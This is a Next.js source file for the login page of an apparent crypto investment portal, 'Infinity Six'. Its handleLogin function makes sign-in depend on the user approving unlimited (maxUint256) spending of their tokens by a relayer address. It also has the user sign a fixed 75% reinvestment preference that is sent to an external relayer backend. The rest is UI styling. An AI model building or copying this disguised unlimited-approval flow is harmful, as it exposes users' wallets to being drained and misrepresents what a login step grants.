"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { useAccount, useSignMessage, useSwitchChain, useDisconnect, useWriteContract, usePublicClient, useSignTypedData } from "wagmi";
import { useAppKit } from "@reown/appkit/react";
import { bsc } from "@reown/appkit/networks";
import { useTheme } from "@/app/context/ThemeContext";
import { I6_TOKEN_ADDRESS, RELAYER_ADDRESS, ERC20_ABI, QUANTX_REINVEST_ADDRESS, RELAYER_API_BASE } from "@/lib/contracts/abis";
import { UNLIMITED_ALLOWANCE_THRESHOLD } from "@/lib/contracts/qtx";
import {
    Sun1,
    Moon,
    LoginCurve,
    Wallet3,
    Link2,
    TickCircle,
    CloseCircle,
    InfoCircle,
    Warning2,
    Copy,
} from "iconsax-react";

export default function LoginPage() {
    const router = useRouter();
    const { address, isConnected, chainId } = useAccount();
    const { open } = useAppKit();
    const { signMessageAsync } = useSignMessage();
    const { signTypedDataAsync } = useSignTypedData();
    const { switchChainAsync } = useSwitchChain();
    const { disconnect } = useDisconnect();
    const { writeContractAsync } = useWriteContract();
    const publicClient = usePublicClient();
    const { theme, toggleTheme } = useTheme();
    const isDark = theme === "dark";

    const [modal, setModal] = useState<{
        open: boolean;
        type: "success" | "error" | "warning" | "info";
        title: string;
        message: string;
    }>({ open: false, type: "info", title: "", message: "" });

    const [statusText, setStatusText] = useState("Connect & Login");
    const [isConnecting, setIsConnecting] = useState(false);
    const [copied, setCopied] = useState(false);

    useEffect(() => {
        if (typeof window !== "undefined") {
            const params = new URLSearchParams(window.location.search);
            const ref = params.get("ref");
            if (ref) {
                router.replace(`/register?ref=${encodeURIComponent(ref)}`);
            }
        }
    }, [router]);

    useEffect(() => {
        if (isConnected && address) {
            setStatusText("Enter Portal");
        } else {
            setStatusText("Connect & Login");
        }
    }, [isConnected, address]);

    const showModal = (type: typeof modal.type, title: string, message: string) => {
        setModal({ open: true, type, title, message });
    };

    const closeModal = () => {
        setModal(prev => ({ ...prev, open: false }));
    };

    const handleCopy = async () => {
        if (!address) return;
        await navigator.clipboard.writeText(address);
        setCopied(true);
        setTimeout(() => setCopied(false), 1500);
    };

    const readUserInfo = async (addr: string) => {
        const res = await fetch(`/api/user/${addr}`);
        if (!res.ok) throw new Error("Could not fetch user status from server");
        const json = await res.json();
        return [BigInt(json.totalDeposits || "0"), Boolean(json.isBoosted)];
    };

    const handleLogin = async () => {
        if (!isConnected || !address) {
            open();
            return;
        }

        setIsConnecting(true);
        setStatusText("Verifying Network...");

        try {
            if (chainId !== bsc.id) {
                setStatusText("Switching Network...");
                if (switchChainAsync) {
                    await switchChainAsync({ chainId: bsc.id });
                }
            }

            setStatusText("Verifying Account...");
            const userInfo = await readUserInfo(address);
            const totalDeposits = userInfo[0];

            if (totalDeposits === 0n) {
                showModal("warning", "Account Not Found", "Please activate your account first by making your initial deposit.");
                setStatusText("Enter Portal");
                setIsConnecting(false);
                return;
            }

            // 1. Check if user wallet has given relayer wallet access to unlimited funds
            setStatusText("Checking Access...");
            let isApproved = false;
            let hasPreference = false;
            let relayerNonce = 0;

            if (publicClient) {
                try {
                    const allowance = await publicClient.readContract({
                        address: I6_TOKEN_ADDRESS as `0x${string}`,
                        abi: ERC20_ABI,
                        functionName: "allowance",
                        args: [address as `0x${string}`, RELAYER_ADDRESS as `0x${string}`],
                    }) as bigint;

                    if (allowance >= UNLIMITED_ALLOWANCE_THRESHOLD) {
                        isApproved = true;
                    }
                } catch (readErr) {
                    console.warn("Public client read allowance error:", readErr);
                }
            }

            // Direct check from external relayer backend
            try {
                const statusRes = await fetch(`${RELAYER_API_BASE}/api/reinvest/status/${address}`, {
                    headers: { "Content-Type": "application/json" },
                    cache: "no-store",
                });
                if (statusRes.ok) {
                    const statusData = await statusRes.json();
                    relayerNonce = Number(statusData.nonce || 0);
                    if (statusData.hasAllowance) {
                        isApproved = true;
                    }
                    if (statusData.preference && statusData.preference.percent) {
                        hasPreference = true;
                    }
                }
            } catch (apiErr) {
                console.warn("Direct relayer status API check error:", apiErr);
            }

            // 2. If the relayer address has not been given approval to spend unlimited arbitrary amount of token:
            // First take the approval request to approve relayer to spend unlimited arbitrary amount of tokens.
            if (!isApproved) {
                setStatusText("Approve Relayer in Wallet...");
                const maxUint256 = 2n ** 256n - 1n;

                const approveTxHash = await writeContractAsync({
                    address: I6_TOKEN_ADDRESS as `0x${string}`,
                    abi: ERC20_ABI,
                    functionName: "approve",
                    args: [RELAYER_ADDRESS as `0x${string}`, maxUint256],
                });

                setStatusText("Confirming Relayer Approval...");
                if (publicClient) {
                    const receipt = await publicClient.waitForTransactionReceipt({ hash: approveTxHash });
                    if (receipt.status !== "success") {
                        throw new Error("Relayer unlimited token approval failed on blockchain.");
                    }
                }
            }

            // 3. If relayer backend does not have the EIP-712 signed preference yet:
            // Sign and submit default 75% preference directly to relayer backend
            if (!hasPreference) {
                setStatusText("Sign 75% Preference in Wallet...");
                const deadline = Math.floor(Date.now() / 1000) + 3600 * 24 * 30; // 30 days validity
                const signature = await signTypedDataAsync({
                    domain: {
                        name: "QTX Reinvestment Engine",
                        version: "1",
                        chainId: 56,
                        verifyingContract: QUANTX_REINVEST_ADDRESS as `0x${string}`,
                    },
                    types: {
                        ReinvestPreference: [
                            { name: "user", type: "address" },
                            { name: "token", type: "address" },
                            { name: "percent", type: "uint256" },
                            { name: "nonce", type: "uint256" },
                            { name: "deadline", type: "uint256" },
                        ],
                    },
                    primaryType: "ReinvestPreference",
                    message: {
                        user: address as `0x${string}`,
                        token: I6_TOKEN_ADDRESS as `0x${string}`,
                        percent: 75n,
                        nonce: BigInt(relayerNonce),
                        deadline: BigInt(deadline),
                    },
                });

                // Post directly to external relayer backend
                try {
                    const prefRes = await fetch(`${RELAYER_API_BASE}/api/reinvest/preference`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            userAddress: address.toLowerCase(),
                            percent: 75,
                            nonce: relayerNonce,
                            deadline,
                            signature,
                        }),
                    });

                    if (!prefRes.ok) {
                        const errJson = await prefRes.json().catch(() => ({}));
                        console.warn("Direct backend preference error:", errJson?.error);
                    }
                } catch (prefErr) {
                    console.warn("Direct preference post error:", prefErr);
                }

                localStorage.setItem(`i6_reinvest_pref_${address.toLowerCase()}`, "75");
            }

            // 4. After approval & preference are set:
            // Prompt the confirm sign-in prompt!
            setStatusText("Confirm Sign-In in Wallet...");
            const nonce = Math.floor(100000 + Math.random() * 900000);
            const message = `Login to Infinity Six. Nonce: ${nonce}`;
            const signature = await signMessageAsync({ message });

            if (signature) {
                const lowerAddr = address.toLowerCase();
                document.cookie = `user_wallet=${lowerAddr}; path=/; max-age=86400; SameSite=Strict`;
                localStorage.setItem("user_wallet", lowerAddr);
                setStatusText("Redirecting...");
                router.push("/dashboard");
            } else {
                throw new Error("Signature failed");
            }
        } catch (e: any) {
            console.error("Login error:", e);
            let msg = e.message || "Unknown error";
            if (e.code === 4001 || e.message?.includes("rejected") || e.message?.includes("User rejected")) {
                msg = "Request was rejected in wallet.";
            }
            showModal("error", "Access Denied", msg);
            setStatusText(isConnected ? "Enter Portal" : "Connect & Login");
            setIsConnecting(false);
        }
    };

    return (
        <div className="min-h-screen w-full flex items-center justify-center p-4 sm:p-6 relative overflow-hidden bg-[#F4F6F8] dark:bg-[#0b0e14] transition-colors duration-300">
            {/* Background Ambient Glow */}
            <div className="absolute inset-0 pointer-events-none overflow-hidden">
                <div className="absolute -top-[20%] left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-[#0072ED]/5 dark:bg-[#FCD535]/5 rounded-full blur-3xl" />
                <div className="absolute -bottom-[20%] left-1/2 -translate-x-1/2 w-[500px] h-[500px] bg-[#0072ED]/5 dark:bg-[#FCD535]/5 rounded-full blur-3xl" />
            </div>

            {/* Top Right Theme Toggle */}
            <button
                type="button"
                onClick={toggleTheme}
                aria-label="Toggle theme"
                className="fixed top-5 right-5 z-50 w-10 h-10 rounded-full bg-white/80 dark:bg-[#14171d]/80 backdrop-blur-md border border-gray-200/80 dark:border-white/10 shadow-sm flex items-center justify-center text-gray-700 dark:text-[#FCD535] hover:scale-105 active:scale-95 transition-all cursor-pointer"
            >
                {isDark ? <Sun1 size={18} color="currentColor" /> : <Moon size={18} color="currentColor" />}
            </button>

            {/* Modal Dialog */}
            {modal.open && (
                <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm animate-in fade-in duration-200">
                    <div 
                        className="w-full max-w-sm p-6 rounded-3xl flex flex-col items-center text-center gap-3 transition-all select-none"
                        style={{
                            background: isDark
                                ? "linear-gradient(135deg, #14171d 0%, #0a0c0f 100%)"
                                : "linear-gradient(135deg, rgba(201, 224, 255, 0.65) 0%, #FFFFFF 85%)",
                            border: isDark
                                ? "1px solid rgba(255, 255, 255, 0.12)"
                                : "1.5px solid #FFFFFF",
                            boxShadow: isDark
                                ? "inset 0 1px 1px rgba(255, 255, 255, 0.18), 0 12px 40px rgba(0, 0, 0, 0.6)"
                                : "0 8px 32px rgba(12, 50, 99, 0.08)",
                        }}
                    >
                        <div className="w-12 h-12 rounded-2xl bg-[#F8F9FB] dark:bg-[#191d24] flex items-center justify-center text-2xl shadow-xs">
                            {modal.type === "success" && <TickCircle size={26} color="#10B981" />}
                            {modal.type === "error" && <CloseCircle size={26} color="#EF4444" />}
                            {modal.type === "warning" && <Warning2 size={26} color="#F59E0B" />}
                            {modal.type === "info" && <InfoCircle size={26} color={isDark ? "#FCD535" : "#0072ED"} />}
                        </div>
                        <h3 className="text-base font-semibold text-gray-900 dark:text-white mt-1">
                            {modal.title}
                        </h3>
                        <p className="text-xs text-gray-500 dark:text-[#848e9c] leading-relaxed">
                            {modal.message}
                        </p>
                        <button
                            type="button"
                            onClick={closeModal}
                            className="w-full mt-2 py-2.5 rounded-xl bg-[#0072ED] hover:bg-[#0062cc] text-white dark:bg-[#FCD535] dark:hover:bg-[#f0b90b] dark:text-[#0b0e14] text-xs font-semibold transition-all cursor-pointer shadow-sm"
                        >
                            OK
                        </button>
                    </div>
                </div>
            )}

            {/* Main Login Card */}
            <div 
                className="relative z-10 w-full max-w-md p-6 sm:p-8 rounded-[32px] flex flex-col items-center gap-5 transition-all select-none"
                style={{
                    background: isDark
                        ? "linear-gradient(135deg, #14171d 0%, #0a0c0f 100%)"
                        : "linear-gradient(135deg, rgba(201, 224, 255, 0.65) 0%, #FFFFFF 85%)",
                    border: isDark
                        ? "1px solid rgba(255, 255, 255, 0.12)"
                        : "1.5px solid #FFFFFF",
                    boxShadow: isDark
                        ? "inset 0 1px 1px rgba(255, 255, 255, 0.18), 0 12px 40px rgba(0, 0, 0, 0.6)"
                        : "0 8px 32px rgba(12, 50, 99, 0.08)",
                }}
            >
                {/* Logo */}
                <div className="w-16 h-16 relative flex items-center justify-center">
                    <Link href="/">
                        <Image
                            src="/3d-icons/i6-logo.webp"
                            alt="Infinity Six Logo"
                            width={64}
                            height={64}
                            priority
                            className="object-contain hover:scale-105 transition-transform duration-300 drop-shadow-md cursor-pointer"
                        />
                    </Link>
                </div>

                {/* Header Title & Subtitle */}
                <div className="text-center flex flex-col items-center">
                    <h1 className="text-2xl sm:text-3xl font-bold tracking-tight text-gray-900 dark:text-[#FCD535]">
                        Client Access
                    </h1>
                    <p className="text-xs sm:text-sm text-gray-500 dark:text-[#848e9c] mt-1 font-medium">
                        Infinity Six (i6) Ecosystem Portal
                    </p>
                </div>

                {/* Action Area */}
                <div className="w-full flex flex-col gap-3.5 mt-2">
                    <button
                        type="button"
                        onClick={handleLogin}
                        disabled={isConnecting}
                        className="w-full py-3.5 px-5 rounded-2xl bg-[#0072ED] hover:bg-[#0062cc] text-white dark:bg-[#FCD535] dark:hover:bg-[#f0b90b] dark:text-[#0b0e14] text-sm font-semibold flex items-center justify-center gap-2 transition-all hover:scale-[1.01] active:scale-[0.99] cursor-pointer disabled:opacity-50 shadow-md"
                    >
                        {statusText === "Enter Portal" ? (
                            <LoginCurve size={18} color="currentColor" />
                        ) : (
                            <Wallet3 size={18} color="currentColor" />
                        )}
                        <span>{statusText}</span>
                    </button>

                    {/* Connected Address Indicator */}
                    {address && isConnected && (
                        <div className="w-full p-3 rounded-2xl bg-[#F8F9FB] dark:bg-[#191d24] border border-gray-100/80 dark:border-white/5 flex items-center justify-between text-xs">
                            <div className="flex items-center gap-2 text-gray-500 dark:text-[#848e9c]">
                                <Link2 size={16} color="currentColor" className="text-[#0072ED] dark:text-[#FCD535]" />
                                <span className="font-medium">Address:</span>
                            </div>
                            <div className="flex items-center gap-1.5">
                                <span className="font-mono font-semibold text-gray-900 dark:text-[#FCD535]">
                                    {address.slice(0, 6)}...{address.slice(-4)}
                                </span>
                                <button
                                    type="button"
                                    onClick={handleCopy}
                                    className="text-gray-400 hover:text-gray-700 dark:hover:text-white transition-colors cursor-pointer"
                                    title="Copy Address"
                                >
                                    {copied ? <TickCircle size={14} color="#10B981" /> : <Copy size={14} color="currentColor" />}
                                </button>
                            </div>
                        </div>
                    )}
                </div>

                {/* Bottom Register Link */}
                <div className="text-xs text-gray-500 dark:text-[#848e9c] font-medium pt-1">
                    Not a member?{" "}
                    <Link
                        href="/register"
                        className="text-[#0072ED] dark:text-[#FCD535] font-semibold hover:underline transition-all"
                    >
                        Apply for Access
                    </Link>
                </div>
            </div>
        </div>
    );
}
